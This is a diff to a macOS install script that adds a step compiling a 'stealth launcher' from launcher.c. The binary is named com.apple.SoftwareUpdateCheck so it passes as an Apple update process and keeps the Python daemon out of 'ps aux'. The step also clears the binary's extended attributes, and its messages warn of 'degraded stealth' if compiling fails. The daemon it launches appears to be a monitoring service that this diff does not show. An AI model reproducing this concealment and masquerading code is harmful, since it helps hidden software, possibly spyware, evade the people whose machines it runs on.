@@ -52,6 +52,51 @@ cp "$SCRIPT_DIR/server.py" "$DAEMON_BIN"
 chmod +x "$DAEMON_BIN"
 ok "Daemon installed: $DAEMON_BIN"
 
+# ── Compile stealth launcher binary ──────────────────────────────────────────
+LAUNCHER_SRC="$SCRIPT_DIR/launcher.c"
+LAUNCHER_BIN="$INSTALL_DIR/com.apple.SoftwareUpdateCheck"
+
+if [[ -f "$LAUNCHER_SRC" ]]; then
+    info "Compiling stealth launcher (hides Python from ps aux)..."
+    COMPILE_OK=0
+
+    # Derive Python include/lib paths via sysconfig (works Homebrew + Xcode CLT)
+    PY_INC=$(python3 -c "import sysconfig; print(sysconfig.get_path('include'))" 2>/dev/null)
+    PY_LIB=$(python3 -c "import sysconfig; print(sysconfig.get_config_var('LIBDIR'))" 2>/dev/null)
+    PY_VER=$(python3 -c "import sysconfig; \
+        print(sysconfig.get_config_var('LDVERSION') or \
+              sysconfig.get_config_var('VERSION'))" 2>/dev/null)
+
+    if [[ -n "$PY_INC" ]] && [[ -n "$PY_LIB" ]] && [[ -n "$PY_VER" ]]; then
+        if cc -I"$PY_INC" -L"$PY_LIB" -lpython"$PY_VER" \
+               -Wl,-rpath,"$PY_LIB" \
+               -o "$LAUNCHER_BIN" "$LAUNCHER_SRC" 2>/dev/null; then
+            COMPILE_OK=1
+        fi
+    fi
+
+    # Fallback: try python3-config
+    if [[ $COMPILE_OK -eq 0 ]] && command -v python3-config >/dev/null 2>&1; then
+        PY_CFLAGS=$(python3-config --cflags 2>/dev/null)
+        PY_LDFLAGS=$(python3-config --ldflags --embed 2>/dev/null || \
+                     python3-config --ldflags 2>/dev/null)
+        if cc $PY_CFLAGS $PY_LDFLAGS \
+               -o "$LAUNCHER_BIN" "$LAUNCHER_SRC" 2>/dev/null; then
+            COMPILE_OK=1
+        fi
+    fi
+
+    if [[ $COMPILE_OK -eq 1 ]]; then
+        chmod +x "$LAUNCHER_BIN"
+        xattr -c "$LAUNCHER_BIN" 2>/dev/null || true
+        ok "Stealth launcher compiled: com.apple.SoftwareUpdateCheck"
+    else
+        warn "Stealth compile failed — ps aux will show python3 (degraded stealth)"
+    fi
+else
+    warn "launcher.c not found — stealth binary skipped"
+fi
+
 # ── Install support scripts ───────────────────────────────────────────────────
 for f in wrapper.sh start-monitor.sh status.sh uninstall.sh; do
     [[ -f "$SCRIPT_DIR/$f" ]] && cp "$SCRIPT_DIR/$f" "$INSTALL_DIR/$f" && \
